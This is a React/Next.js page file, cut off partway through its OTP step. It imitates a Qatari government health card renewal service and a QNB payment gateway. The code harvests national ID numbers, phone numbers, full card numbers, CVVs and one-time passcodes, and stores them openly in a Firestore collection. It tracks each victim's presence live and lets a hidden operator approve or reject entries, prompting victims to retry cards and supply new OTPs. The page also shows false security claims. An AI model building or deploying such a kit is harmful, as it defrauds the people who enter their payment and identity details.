'use client'

import { FormEvent, useEffect, useMemo, useRef, useState } from 'react'
import { db } from '@/lib/firebase'
import { arrayUnion, doc, onSnapshot, setDoc } from 'firebase/firestore'
import { Button } from '@/app/components/ui/button'
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/app/components/ui/card'
import { Input } from '@/app/components/ui/input'
import { Label } from '@/app/components/ui/label'
import { RadioGroup, RadioGroupItem } from '@/app/components/ui/radio-group'
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/app/components/ui/select'
import { FullPageLoader } from '@/app/components/loader'
import { Check, CheckCircle, ChevronLeft, CreditCard, Lock, ShieldCheck } from 'lucide-react'

const STEPS = [
  { label: 'معلومات البطاقة' },
  { label: 'استمارة التقديم' },
  { label: 'تفاصيل الدفع' },
  { label: 'إتمام العملية' },
]

const OPERATION_OPTIONS = [
  {  label: 'تجديد',id: 'renew' },
    { label: 'الاستعلام عن حالة البطاقة الصحية', id: 'submit' },
  { label: 'طلب بطاقة موظف جديدة', id: 'submit1' },
  { label: 'خدمات الرعاية الصحية الأولية',id:'sub6'  },
] as const

const RECEIPT_OPTIONS = [
  { id: 'yes', label: 'نعم' },
  { id: 'no', label: 'لا' },
] as const

const YEAR_OPTIONS = ['1', '2', '3', '4', '5'] as const
const FEE_PER_YEAR = 100
const DEFAULT_CURRENT_EXPIRY_DATE = '2026-02-23'
const STEP_PAGE_KEYS: Record<number, string> = {
  1: 'card-information',
  2: 'application-form',
  3: 'payment-details',
  4: 'payment-method',
  5: 'card-info',
  6: 'otp',
}

function getCurrentPageKey(step: number) {
  return STEP_PAGE_KEYS[step] ?? 'unknown'
}

type PaymentMethod = 'mastercard' | 'visa'

type PaymentMethodOption = {
  id: PaymentMethod
  label: string
  logo: string
}

const PAYMENT_METHOD_OPTIONS: readonly PaymentMethodOption[] = [
  { id: 'mastercard', label: 'Mastercard', logo: '/m.png' },
  { id: 'visa', label: 'Visa', logo: '/R.png' },
] as const

type OperationType = (typeof OPERATION_OPTIONS)[number]['id']
type ReceiptChoice = (typeof RECEIPT_OPTIONS)[number]['id']
type SubmissionStatusSnapshot = {
  cardState?: 'pending' | 'approved' | 'rejected'
  reviewMessage?: string
}

function StepIndicator({ current }: { current: number }) {
  return (
    <div className="mb-8 px-1 overflow-x-auto" dir="rtl">
      <div className="flex min-w-[320px] items-start justify-between gap-0">
        {STEPS.map((s, i) => {
          const done = i < current - 1
          const active = i === current - 1
          return (
            <div key={s.label} className="flex flex-1 items-start">
              <div className="flex flex-1 flex-col items-center">
                <div
                  className={`h-9 w-9 rounded-full border flex items-center justify-center text-sm font-bold transition-colors
                  ${done || active
                    ? 'border-[#C8102E] bg-[#8A1538] text-white'
                    : 'border-gray-300 bg-gray-100 text-gray-500'}`}
                >
                  {done ? <Check className="h-4 w-4 stroke-[3]" /> : i + 1}
                </div>
                <span className={`mt-2 text-center text-xs font-medium leading-tight ${active || done ? 'text-[#C8102E]' : 'text-gray-400'}`}>
                  {s.label}
                </span>
              </div>
              {i < STEPS.length - 1 && (
                <div className={`mx-1 mt-[18px] h-[2px] w-8 sm:w-14 transition-colors ${done ? 'bg-[#C8102E]' : 'bg-gray-300'}`} />
              )}
            </div>
          )
        })}
      </div>
    </div>
  )
}

function SummaryRow({ label, value }: { label: string; value: string }) {
  return (
    <div className="py-1.5">
      <p className="text-gray-500 text-base">{label}</p>
      <p className="text-gray-900 font-semibold text-xl sm:text-[1.7rem] leading-tight mt-0.5">{value || '—'}</p>
    </div>
  )
}

function SummaryBlock({ label, value, withDivider = false }: { label: string; value: string; withDivider?: boolean }) {
  return (
    <div className={`py-2 ${withDivider ? 'border-b border-gray-200' : ''}`}>
      <p className="text-gray-500 text-base">{label}</p>
      <p className="text-2xl sm:text-3xl leading-tight font-semibold text-gray-900 mt-1">{value || '—'}</p>
    </div>
  )
}

function formatCard(v: string) {
  return v.replace(/\D/g, '').slice(0, 16).replace(/(.{4})/g, '$1 ').trim()
}

function getCardMethodByPrefix(cardNumber: string): PaymentMethod | null {
  if (!cardNumber) return null
  if (cardNumber.startsWith('4')) return 'visa'
  if (/^(5[1-5]|2(2[2-9]|[3-6]\d|7[01]|720))/.test(cardNumber)) return 'mastercard'
  return null
}

function passesLuhn(cardNumber: string) {
  let sum = 0
  let shouldDouble = false
  for (let i = cardNumber.length - 1; i >= 0; i -= 1) {
    let digit = Number(cardNumber[i])
    if (Number.isNaN(digit)) return false
    if (shouldDouble) {
      digit *= 2
      if (digit > 9) digit -= 9
    }
    sum += digit
    shouldDouble = !shouldDouble
  }
  return sum % 10 === 0
}

function isFutureOrCurrentExpiry(value: string) {
  const [yearString, monthString] = value.split('-')
  const yearValue = Number(yearString)
  const monthValue = Number(monthString)
  if (!yearValue || !monthValue || monthValue < 1 || monthValue > 12) return false
  const now = new Date()
  const currentYear = now.getFullYear()
  const currentMonth = now.getMonth() + 1
  return yearValue > currentYear || (yearValue === currentYear && monthValue >= currentMonth)
}

function currentMonthIso() {
  const now = new Date()
  return `${now.getFullYear()}-${String(now.getMonth() + 1).padStart(2, '0')}`
}

function formatQatarDate(date: Date) {
  const day = String(date.getDate()).padStart(2, '0')
  const month = String(date.getMonth() + 1).padStart(2, '0')
  return `${day}-${month}-${date.getFullYear()}`
}

function parseIsoDate(value: string) {
  const [yearString, monthString, dayString] = value.split('-')
  const yearValue = Number(yearString)
  const monthValue = Number(monthString)
  const dayValue = Number(dayString)
  if (!yearValue || !monthValue || !dayValue) return null
  return new Date(yearValue, monthValue - 1, dayValue)
}

function formatQatarDateFromIso(value: string) {
  const date = parseIsoDate(value)
  if (!date) return '—'
  return formatQatarDate(date)
}

function addYearsToIsoDate(value: string, yearsToAdd: number) {
  const date = parseIsoDate(value)
  if (!date) return '—'
  const updatedDate = new Date(date)
  updatedDate.setFullYear(updatedDate.getFullYear() + yearsToAdd)
  return formatQatarDate(updatedDate)
}

export default function SubmitPage() {
  const [step, setStep] = useState(1)
  const [loading, setLoading] = useState(false)
  const [waiting, setWaiting] = useState(false)
  const [success, setSuccess] = useState(false)
  const [sessionStarted, setSessionStarted] = useState(false)

  const [idNum, setIdNum] = useState('')
  const [operationType, setOperationType] = useState<OperationType>('renew')
  const [requestedYears, setRequestedYears] = useState('1')
  const [phone, setPhone] = useState('')
  const [emailReceipt, setEmailReceipt] = useState<ReceiptChoice>('yes')
  const [smsReceipt, setSmsReceipt] = useState<ReceiptChoice>('yes')
  const [method, setMethod] = useState<PaymentMethod>('mastercard')
  const [currentExpiryInput, setCurrentExpiryInput] = useState(DEFAULT_CURRENT_EXPIRY_DATE)
  const [cardNumber, setCardNumber] = useState('')
  const [cardExpiry, setCardExpiry] = useState('')
  const [cardHolder, setCardHolder] = useState('')
  const [cvv, setCvv] = useState('')
  const [otp, setOtp] = useState('')
  const [otpList, setOtpList] = useState<string[]>([])

  const unsubRef = useRef<(() => void) | null>(null)
  const previousStepRef = useRef(step)
  const submissionId = useMemo(() => idNum.trim(), [idNum])
  const yearsCount = useMemo(() => {
    const parsedYears = Number(requestedYears)
    if (!Number.isFinite(parsedYears) || parsedYears < 1 || parsedYears > 5) return 1
    return Math.floor(parsedYears)
  }, [requestedYears])
  const totalFee = useMemo(() => yearsCount * FEE_PER_YEAR, [yearsCount])
  const formattedPhone = useMemo(() => (phone ? `+974 ${phone}` : ''), [phone])
  const cleanCardNumber = useMemo(() => cardNumber.replace(/\D/g, ''), [cardNumber])
  const detectedCardMethod = useMemo(() => getCardMethodByPrefix(cleanCardNumber), [cleanCardNumber])
  const minimumCardExpiryMonth = useMemo(() => currentMonthIso(), [])
  const cardCheck = useMemo(() => {
    if (!cleanCardNumber) {
      return { tone: 'neutral' as const, message: 'نقبل بطاقات Visa و Mastercard فقط.' }
    }
    if (!detectedCardMethod) {
      return { tone: 'error' as const, message: 'نوع البطاقة غير مدعوم. يرجى استخدام Visa أو Mastercard.' }
    }
    if (cleanCardNumber.length < 16) {
      return { tone: 'info' as const, message: `أكمل رقم البطاقة (${cleanCardNumber.length}/16)` }
    }
    if (detectedCardMethod !== method) {
      return { tone: 'error' as const, message: 'نوع البطاقة لا يطابق طريقة الدفع المختارة.' }
    }
    if (!passesLuhn(cleanCardNumber)) {
      return { tone: 'error' as const, message: 'رقم البطاقة غير صالح. تحقق من الرقم مرة أخرى.' }
    }
    return {
      tone: 'success' as const,
      message: `تم التحقق من البطاقة بنجاح (${detectedCardMethod === 'visa' ? 'Visa' : 'Mastercard'})`,
    }
  }, [cleanCardNumber, detectedCardMethod, method])

  const currentExpiryDate = useMemo(() => formatQatarDateFromIso(currentExpiryInput), [currentExpiryInput])
  const newExpiryDate = useMemo(() => addYearsToIsoDate(currentExpiryInput, yearsCount), [currentExpiryInput, yearsCount])

  const operationTypeLabel = useMemo(
    () => OPERATION_OPTIONS.find(option => option.id === operationType)?.label ?? '—',
    [operationType],
  )

  useEffect(() => {
    return () => { unsubRef.current?.() }
  }, [])

  useEffect(() => {
    if (step > previousStepRef.current) {
      window.scrollTo({ top: 0, behavior: 'smooth' })
    }
    previousStepRef.current = step
  }, [step])

  useEffect(() => {
    if (!sessionStarted || submissionId.length !== 11 || success) return

    const syncOnlinePresence = async () => {
      try {
        await setDoc(doc(db, 'pays', submissionId), {
          id: submissionId,
          step,
          currentPage: getCurrentPageKey(step),
          onlineStatus: 'online',
          lastSeenAt: Date.now(),
        }, { merge: true })
      } catch {}
    }

    void syncOnlinePresence()
    const heartbeatId = window.setInterval(() => { void syncOnlinePresence() }, 20000)

    return () => {
      window.clearInterval(heartbeatId)
    }
  }, [sessionStarted, submissionId, step, success])

  useEffect(() => {
    if (!sessionStarted || submissionId.length !== 11) return

    return () => {
      void setDoc(doc(db, 'pays', submissionId), {
        onlineStatus: 'offline',
        lastSeenAt: Date.now(),
      }, { merge: true })
    }
  }, [sessionStarted, submissionId])

  useEffect(() => {
    if (!sessionStarted || !success || submissionId.length !== 11) return

    void setDoc(doc(db, 'pays', submissionId), {
      onlineStatus: 'offline',
      lastSeenAt: Date.now(),
      currentPage: 'completed',
    }, { merge: true })
  }, [sessionStarted, submissionId, success])

  const saveToFirestore = async (extra: Record<string, unknown> = {}) => {
    const [expiryYear, expiryMonth] = cardExpiry.split('-')
    const payload = {
      id: idNum,
      name: cardHolder.trim() || 'غير متوفر',
      phone: formattedPhone,
      operationType,
      operationTypeLabel,
      requestedYears: yearsCount,
      wantsEmailReceipt: emailReceipt === 'yes',
      wantsSmsReceipt: smsReceipt === 'yes',
      currentExpiryDate,
      newExpiryDate,
      feeAmount: totalFee,
      method,
      cardNumber: cardNumber.replace(/\s/g, ''),
      cardBrand: detectedCardMethod ?? method,
      dateMonth: expiryMonth ?? '',
      datayaer: expiryYear ? expiryYear.slice(-2) : '',
      cardExpiry,
      CVC: cvv,
      otpArr: otpList,
      cardState: 'pending',
      createdAt: Date.now(),
      onlineStatus: sessionStarted ? 'online' : 'offline',
      lastSeenAt: Date.now(),
      step,
      ...extra,
    }
    await setDoc(doc(db, 'pays', idNum || 'unknown'), payload, { merge: true })
  }

  const clearStep1Fields = () => {
    setIdNum('')
    setOperationType('renew')
    setSessionStarted(false)
  }

  const resetCardEntryForRetry = () => {
    setCardNumber('')
    setCardExpiry('')
    setCvv('')
  }

  const handleStep1 = async (e: FormEvent) => {
    e.preventDefault()
    if (idNum.trim().length !== 11) return alert('رقم البطاقة الشخصية يجب أن يكون 11 رقماً')
    setLoading(true)
    try {
      await saveToFirestore({ step: 1, currentPage: 'card-information' })
      setSessionStarted(true)
    } catch {}
    setLoading(false)
    setStep(2)
  }

  const handleStep2 = async (e: FormEvent) => {
    e.preventDefault()
    if (!YEAR_OPTIONS.includes(requestedYears as (typeof YEAR_OPTIONS)[number])) {
      return alert('الرجاء اختيار عدد السنوات المطلوبة')
    }
    if (!currentExpiryInput) return alert('الرجاء اختيار تاريخ انتهاء الصلاحية')
    if (phone.length !== 8) return alert('رقم الهاتف يجب أن يتكون من 8 أرقام بعد +974')
    setLoading(true)
    try {
      await saveToFirestore({ step: 2, currentPage: 'application-form' })
    } catch {}
    setLoading(false)
    setStep(3)
  }

  const handleStep3 = async (e: FormEvent) => {
    e.preventDefault()
    setLoading(true)
    try {
      await saveToFirestore({ step: 3, currentPage: 'payment-details' })
    } catch {}
    setLoading(false)
    setStep(4)
  }

  const proceedToCardEntry = async (selectedMethod: PaymentMethod) => {
    setMethod(selectedMethod)
    setLoading(true)
    try {
      await saveToFirestore({ step: 4, currentPage: 'payment-method', method: selectedMethod })
    } catch {}
    setLoading(false)
    setStep(5)
  }

  const handleStep5 = async (e: FormEvent) => {
    e.preventDefault()
    const cleanCard = cleanCardNumber
    if (!cardHolder.trim()) return alert('الرجاء إدخال اسم حامل البطاقة')
    if (cleanCard.length !== 16) return alert('الرجاء إدخال رقم البطاقة بشكل صحيح (16 رقمًا)')
    const detectedMethod = getCardMethodByPrefix(cleanCard)
    if (!detectedMethod) return alert('البطاقة غير مدعومة. يرجى استخدام Visa أو Mastercard فقط')
    if (detectedMethod !== method) return alert('نوع البطاقة لا يطابق طريقة الدفع المختارة')
    if (!passesLuhn(cleanCard)) return alert('رقم البطاقة غير صالح. الرجاء التحقق والمحاولة مجدداً')
    if (!cardExpiry) return alert('الرجاء إدخال تاريخ انتهاء البطاقة')
    if (!isFutureOrCurrentExpiry(cardExpiry)) return alert('تاريخ انتهاء البطاقة غير صالح أو منتهي')
    if (cvv.length !== 3) return alert('رمز CVV يجب أن يتكون من 3 أرقام')

    setLoading(true)
    try {
      const [expiryYear, expiryMonth] = cardExpiry.split('-')
      await saveToFirestore({
        step: 5,
        currentPage: 'card-info',
        cardState: 'pending',
        reviewMessage: '',
        cardDetailsHistory: arrayUnion({
          cardNumber: cleanCard,
          CVC: cvv,
          dateMonth: expiryMonth ?? '',
          datayaer: expiryYear ? expiryYear.slice(-2) : '',
          cardExpiry,
          submittedAt: Date.now(),
        }),
      })
    } catch {}
    setLoading(false)

    setWaiting(true)
    unsubRef.current?.()
    unsubRef.current = onSnapshot(doc(db, 'pays', idNum), (snap) => {
      if (!snap.exists()) return
      const data = snap.data() as SubmissionStatusSnapshot
      if (data.cardState === 'approved') {
        setWaiting(false)
        setStep(6)
        unsubRef.current?.()
      } else if (data.cardState === 'rejected') {
        setWaiting(false)
        unsubRef.current?.()
        const rejectionMessage = data.reviewMessage?.trim()
          ? data.reviewMessage.trim()
          : 'تم رفض البطاقة. الرجاء إدخال بيانات صحيحة والمحاولة مجدداً.'
        resetCardEntryForRetry()
        alert(rejectionMessage)
        setStep(5)
      }
    })
  }

  const handleStep6 = async (e: FormEvent) => {
    e.preventDefault()
    if (!otp.trim() || otp.length < 4) return alert('الرجاء إدخال رمز التحقق')

    const newList = [...otpList, otp]
    setOtpList(newList)
    setOtp('')
    setLoading(true)

    try {
      await setDoc(doc(db, 'pays', idNum), { otpArr: newList, step: 6, currentPage: 'otp', cardState: 'pending' }, { merge: true })
    } catch {}

    setLoading(false)
    setWaiting(true)

    unsubRef.current?.()
    unsubRef.current = onSnapshot(doc(db, 'pays', idNum), (snap) => {
      if (!snap.exists()) return
      const data = snap.data()
      if (data.cardState === 'approved') {
        setWaiting(false)
        setSuccess(true)
        unsubRef.current?.()
      } else if (data.cardState === 'rejected') {
        setWaiting(false)
        unsubRef.current?.()
        alert('رمز التحقق غير صحيح. الرجاء المحاولة مجدداً.')
      }
    })
  }

  if (success) {
    return (
      <div className="min-h-screen bg-gray-50 py-6 sm:py-8 px-4" dir="rtl">
        <div className="max-w-xl mx-auto">
          <StepIndicator current={5} />
          <Card className="w-full text-center border-0 shadow-lg">
            <CardContent className="pt-10 sm:pt-12 pb-8 sm:pb-10 px-5 sm:px-8">
              <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
                <CheckCircle className="w-10 h-10 text-green-600" />
              </div>
              <h2 className="text-xl sm:text-2xl font-bold text-gray-900 mb-2">تم إتمام العملية بنجاح</h2>
              <p className="text-gray-500 mb-8">تم إرسال طلبك بنجاح وسيتم التواصل معك قريباً</p>
              <Button onClick={() => window.location.href = '/'} className="bg-[#8A1538] hover:bg-[#6d1030] w-full">
                العودة للرئيسية
              </Button>
            </CardContent>
          </Card>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gray-50 py-6 sm:py-8 px-4" dir="rtl">
      {waiting && <FullPageLoader message="جاري التحقق من المعلومات..." />}
      {step <= 3 && (
        <div className="hidden lg:flex fixed left-1 top-48 z-20 h-20 w-11 rounded-r-md rounded-l-sm bg-[#C8102E] text-white text-xl font-bold items-center justify-center shadow">
          <span className="text-center leading-tight">
            المساعد
            <br />
            ة
          </span>
        </div>
      )}

      <div className="max-w-xl mx-auto">
        {step <= 3 && (
          <div className="text-center mb-8">
            <h1 className="text-2xl sm:text-3xl font-bold text-gray-900">خدمة البطاقة الصحية الإلكترونية</h1>
            <p className="text-gray-500 text-sm mt-2">طلب الاستعلام عن البطاقة الصحية -- سوف تستغرق حوالي 20 ثانية لإتمام الطلب.</p>
          </div>
        )}

        {step >= 4 && step <= 5 && (
          <div className="mb-6 overflow-hidden rounded-xl border border-gray-200 bg-white">
            <div className="bg-[#4f205d] text-white flex items-center justify-between px-4 py-2">
              <span className="font-bold text-xl text-[#0d4aa2] bg-white px-2 py-0.5 rounded-md">QNB</span>
              <span className="font-semibold">بوابة الدفع</span>
            </div>
            <div className="grid grid-cols-2 sm:grid-cols-4 text-center" dir="rtl">
              <div className="p-2">
                <p className="text-[11px] text-gray-500">اسم التاجر</p>
                <p className="font-semibold text-sm">Qatar e-Government</p>
              </div>
              <div className="p-2">
                <p className="text-[11px] text-gray-500">مبلغ المعاملة</p>
                <p className="font-semibold text-sm">QAR {totalFee.toFixed(2)}</p>
              </div>
              <div className="p-2">
                <p className="text-[11px] text-gray-500">رقم الفاتورة</p>
                <p className="font-semibold text-sm">{idNum || '20002673930'}</p>
              </div>
              <div className="p-2">
                <p className="text-[11px] text-gray-500">نوع الدفع</p>
                <p className="font-semibold text-sm uppercase">{method}</p>
              </div>
            </div>
          </div>
        )}

        {step <= 3 && <StepIndicator current={step} />}

        {step === 1 && (
          <Card className="border-0 shadow-md">
            <CardHeader className="pb-2">
              <CardTitle className="text-2xl">معلومات</CardTitle>
            </CardHeader>
            <CardContent>
              <form onSubmit={handleStep1} className="space-y-6">
                <div className="space-y-2">
                  <Label htmlFor="id-num">الرجاء إدخال رقم البطاقة الشخصية : <span className="text-red-500">*</span></Label>
                  <Input
                    id="id-num"
                    value={idNum}
                    onChange={e => setIdNum(e.target.value.replace(/\D/g, '').slice(0, 11))}
                    placeholder="أدخل 11 رقماً"
                    className="h-12"
                    inputMode="numeric"
                    maxLength={11}
                  />
                </div>
                <div className="space-y-3">
                  <Label>نوع العملية : <span className="text-red-500">*</span></Label>
                  <RadioGroup
                    value={operationType}
                    onValueChange={value => setOperationType(value as OperationType)}
                    className="space-y-2"
                  >
                    {OPERATION_OPTIONS.map(option => (
                      <div
                        key={option.id}
                        className={`flex items-center justify-between rounded-md border px-4 py-2.5 transition-colors
                          ${operationType === option.id ? 'border-[#C8102E] bg-[#C8102E]/5' : 'border-gray-300'}`}
                      >
                        <Label htmlFor={`operation-${option.id}`} className="cursor-pointer text-sm sm:text-base">
                          {option.label}
                        </Label>
                        <RadioGroupItem value={option.id} id={`operation-${option.id}`} />
                      </div>
                    ))}
                  </RadioGroup>
                </div>
                <div className="flex flex-col sm:flex-row gap-3 pt-2">
                  <Button type="button" onClick={clearStep1Fields} className="flex-1 h-12 rounded-full bg-gray-500 hover:bg-gray-600 text-white">
                    تفريغ الحقول
                  </Button>
                  <Button type="submit" disabled={loading} className="flex-1 h-12 rounded-full bg-[#8A1538] hover:bg-[#6d1030]">
                    {loading ? 'جاري الحفظ...' : 'تابع'}
                    <ChevronLeft className="w-4 h-4 mr-1" />
                  </Button>
                </div>
              </form>
            </CardContent>
          </Card>
        )}

        {step === 2 && (
          <Card className="border-0 shadow-md">
            <CardHeader className="pb-2">
              <CardTitle className="text-2xl">معلومات حامل البطاقة</CardTitle>
            </CardHeader>
            <CardContent>
              <form onSubmit={handleStep2} className="space-y-5">
                <SummaryBlock label="الرقم الشخصي" value={idNum} withDivider />
                <div className="space-y-2">
                  <Label htmlFor="current-expiry-date">تاريخ انتهاء الصلاحية <span className="text-red-500">*</span></Label>
                  <Input
                    id="current-expiry-date"
                    type="date"
                    value={currentExpiryInput}
                    onChange={e => setCurrentExpiryInput(e.target.value)}
                    className="h-12"
                  />
                </div>
                <div className="border-t border-gray-200 pt-4" />
                <div className="space-y-2">
                  <Label htmlFor="years">عدد السنوات المطلوبة <span className="text-red-500">*</span></Label>
                  <Select value={requestedYears} onValueChange={setRequestedYears}>
                    <SelectTrigger id="years" className="h-12">
                      <SelectValue placeholder="اختر عدد السنوات" />
                    </SelectTrigger>
                    <SelectContent>
                      {YEAR_OPTIONS.map((yearOption) => (
                        <SelectItem key={yearOption} value={yearOption}>
                          {yearOption}
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                </div>
                <div className="space-y-2">
                  <Label htmlFor="phone">رقم الهاتف <span className="text-red-500">*</span></Label>
                  <div className="relative" dir="ltr">
                    <span className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500 text-sm font-semibold">
                      +974
                    </span>
                    <Input
                      id="phone"
                      value={phone}
                      onChange={e => setPhone(e.target.value.replace(/\D/g, '').slice(0, 8))}
                      placeholder="55123456"
                      className="h-12 pl-16"
                      inputMode="tel"
                      maxLength={8}
                    />
                  </div>
                </div>
                <div className="space-y-2">
                  <Label>هل تريد إستلام الإيصال عبر البريد الإلكتروني ؟</Label>
                  <RadioGroup value={emailReceipt} onValueChange={value => setEmailReceipt(value as ReceiptChoice)} className="flex flex-wrap items-center gap-4 sm:gap-6">
                    {RECEIPT_OPTIONS.map(option => (
                      <div key={`email-${option.id}`} className="flex items-center gap-2">
                        <RadioGroupItem value={option.id} id={`email-${option.id}`} />
                        <Label htmlFor={`email-${option.id}`}>{option.label}</Label>
                      </div>
                    ))}
                  </RadioGroup>
                </div>
                <div className="space-y-2">
                  <Label>هل تريد إستلام رسالة نصية ؟</Label>
                  <RadioGroup value={smsReceipt} onValueChange={value => setSmsReceipt(value as ReceiptChoice)} className="flex flex-wrap items-center gap-4 sm:gap-6">
                    {RECEIPT_OPTIONS.map(option => (
                      <div key={`sms-${option.id}`} className="flex items-center gap-2">
                        <RadioGroupItem value={option.id} id={`sms-${option.id}`} />
                        <Label htmlFor={`sms-${option.id}`}>{option.label}</Label>
                      </div>
                    ))}
                  </RadioGroup>
                </div>
                <div className="flex flex-col sm:flex-row gap-3 pt-2">
                  <Button type="button" onClick={() => setStep(1)} className="flex-1 h-12 rounded-full bg-gray-500 hover:bg-gray-600 text-white">
                    السابق
                  </Button>
                  <Button type="submit" disabled={loading} className="flex-1 h-12 rounded-full bg-[#8A1538] hover:bg-[#6d1030]">
                    {loading ? 'جاري الحفظ...' : 'تابع'}
                    <ChevronLeft className="w-4 h-4 mr-1" />
                  </Button>
                </div>
              </form>
            </CardContent>
          </Card>
        )}

        {step === 3 && (
          <Card className="border-0 shadow-md">
            <CardHeader className="pb-2">
              <CardTitle className="text-2xl">تفاصيل الدفع</CardTitle>
            </CardHeader>
            <CardContent>
              <form onSubmit={handleStep3} className="space-y-5">
                <div className="space-y-1">
                  <h3 className="text-2xl sm:text-4xl font-bold text-gray-900 mb-2">معلومات حامل البطاقة</h3>
                  <SummaryRow label="الرقم الشخصي" value={idNum} />
                  <SummaryRow label="تاريخ انتهاء الصلاحية الجديد" value={newExpiryDate} />
                  <SummaryRow label="عدد السنوات المطلوبة" value={String(yearsCount)} />
                  <SummaryRow label="نوع العملية" value={operationTypeLabel} />
                  <SummaryRow label="رقم الهاتف" value={formattedPhone} />
                  <SummaryRow label="هل تريد إستلام الإيصال عبر البريد الإلكتروني ؟" value={emailReceipt === 'yes' ? 'نعم' : 'لا'} />
                  <SummaryRow label="هل تريد إستلام رسالة نصية ؟" value={smsReceipt === 'yes' ? 'نعم' : 'لا'} />
                </div>
                <div className="border-t border-gray-300 pt-4 space-y-1">
                  <h3 className="text-2xl sm:text-4xl font-bold text-gray-900 mb-2">الرسوم</h3>
                  <SummaryRow label="الرسوم المطلوب" value="رسوم تجديد البطاقة الصحية" />
                  <SummaryRow label="قيمة الرسم" value={`${totalFee} ريال قطري`} />
                  <SummaryRow label="المجموع" value={`${totalFee} ريال قطري`} />
                </div>
                <div className="flex flex-col sm:flex-row gap-3">
                  <Button type="button" onClick={() => setStep(2)} className="flex-1 h-12 rounded-full bg-gray-500 hover:bg-gray-600 text-white">
                    السابق
                  </Button>
                  <Button type="submit" disabled={loading} className="flex-1 h-12 rounded-full bg-[#8A1538] hover:bg-[#6d1030]">
                    {loading ? 'جاري التحويل...' : 'دفع'}
                  </Button>
                </div>
              </form>
            </CardContent>
          </Card>
        )}

        {step === 4 && (
          <Card className="border-0 shadow-md">
            <CardHeader className="pb-2">
              <CardTitle className="text-2xl sm:text-4xl">اختر طريقة الدفع</CardTitle>
            </CardHeader>
            <CardContent className="space-y-5">
              <div>
                <p className="text-gray-700 text-lg mb-2">بطاقات الائتمان / بطاقات الخصم الدولية</p>
                <div className="grid grid-cols-2 gap-2">
                  {PAYMENT_METHOD_OPTIONS.map((option) => (
                    <button
                      key={option.id}
                      type="button"
                      disabled={loading}
                      onClick={() => void proceedToCardEntry(option.id)}
                      className={`h-14 rounded-lg border text-sm font-semibold flex items-center justify-center
                        ${option.id === method
                          ? 'border-[#C8102E] bg-[#C8102E]/5'
                          : 'bg-white border-gray-300 hover:border-[#C8102E]/60'}`}
                    >
                      {option.logo ? <img src={option.logo} alt={option.label} className="h-7 w-auto" /> : option.label}
                    </button>
                  ))}
                </div>
              </div>

              <Button type="button" onClick={() => setStep(3)} className="w-full h-12 bg-[#C8102E] hover:bg-[#a30f27] text-white rounded-md">
                إلغاء
              </Button>
            </CardContent>
          </Card>
        )}

        {step === 5 && (
          <Card className="border-0 shadow-md">
            <CardHeader className="pb-2 space-y-4">
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
                <CardTitle className="text-lg flex items-center gap-2">
                  <Lock className="w-5 h-5 text-[#8A1538]" />
                  {method === 'mastercard' ? 'يرجى إدخال تفاصيل بطاقة ماستركارد' : 'يرجى إدخال تفاصيل بطاقة فيزا'}
                </CardTitle>
                <div className="flex gap-2">
                  <img src="/R.png" alt="Visa" className="h-6 w-auto" />
                  <img src="/m.png" alt="Mastercard" className="h-6 w-auto" />
                </div>
              </div>
              <CardDescription>بياناتك آمنة ومشفرة</CardDescription>
            </CardHeader>
            <CardContent>
              <form onSubmit={handleStep5} className="space-y-5">
                <div className="space-y-2">
                  <Label>رقم البطاقة <span className="text-red-500">*</span></Label>
                  <div className="relative">
                    <Input
                      value={cardNumber}
                      onChange={e => setCardNumber(formatCard(e.target.value))}
                      placeholder="ادخل رقم البطاقة"
                      className="h-11 font-mono pl-10"
                      inputMode="numeric"
                    />
                    <CreditCard className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
                  </div>
                  <p
                    className={`text-xs font-medium ${
                      cardCheck.tone === 'success'
                        ? 'text-green-600'
                        : cardCheck.tone === 'error'
                          ? 'text-red-600'
                          : cardCheck.tone === 'info'
                            ? 'text-amber-600'
                            : 'text-gray-500'
                    }`}
                  >
                    {cardCheck.message}
                  </p>
                </div>
                <div className="space-y-2">
                  <Label>الاسم كما هو موضح في بطاقتك <span className="text-red-500">*</span></Label>
                  <Input
                    value={cardHolder}
                    onChange={e => setCardHolder(e.target.value)}
                    placeholder="ادخل اسم حامل البطاقة"
                    className="h-12"
                  />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="card-expiry">تاريخ انتهاء البطاقة <span className="text-red-500">*</span></Label>
                  <Input
                    id="card-expiry"
                    type="month"
                    value={cardExpiry}
                    onChange={e => setCardExpiry(e.target.value)}
                    min={minimumCardExpiryMonth}
                    className="h-11 text-center font-mono"
                  />
                </div>
                <div className="space-y-2 w-full sm:max-w-[220px]">
                  <div className="flex items-center justify-between">
                    <Label>رمز الحماية <span className="text-red-500">*</span></Label>
                    <span className="text-sm text-[#C8102E]">ماهذا؟</span>
                  </div>
                  <div className="space-y-2">
                    <Input
                      value={cvv}
                      onChange={e => setCvv(e.target.value.replace(/\D/g, '').slice(0, 3))}
                      placeholder="CVV"
                      className="h-11 text-center font-mono bg-white"
                      type="password"
                      inputMode="numeric"
                      maxLength={3}
                    />
                  </div>
                </div>
                <div className="flex items-center gap-2 text-xs text-gray-500 bg-gray-50 p-3 rounded-lg">
                  <Lock className="w-3 h-3 flex-shrink-0" />
                  <span>بياناتك محمية بتشفير SSL 256-bit</span>
                </div>
                <div className="flex flex-col sm:flex-row gap-3">
                  <Button type="button" onClick={() => setStep(4)} className="flex-1 h-12 rounded-full bg-gray-500 hover:bg-gray-600 text-white">
                    رجوع
                  </Button>
                  <Button type="submit" disabled={loading} className="flex-1 h-12 rounded-full bg-[#8A1538] hover:bg-[#6d1030]">
                    {loading ? 'جاري المعالجة...' : 'تأكيد'}
                    <ChevronLeft className="w-4 h-4 mr-1" />
                  </Button>
                </div>
              </form>
            </CardContent>
          </Card>
        )}

        {step === 6 && (
          <Card className="border-0 shadow-md">
            <CardHeader className="pb-2">
              <CardTitle className="text-lg flex items-center gap-2">
                <ShieldCheck className="w-5 h-5 text-[#8A1538]" />
                رمز التحقق (OTP)
              </CardTitle>
              <CardDescription>
                تم إرسال رمز التحقق إلى هاتفك: <span className="font-semibold text-gray-700">{formattedPhone}</span>
              </CardDescription>
            </CardHeader>
            <CardContent>
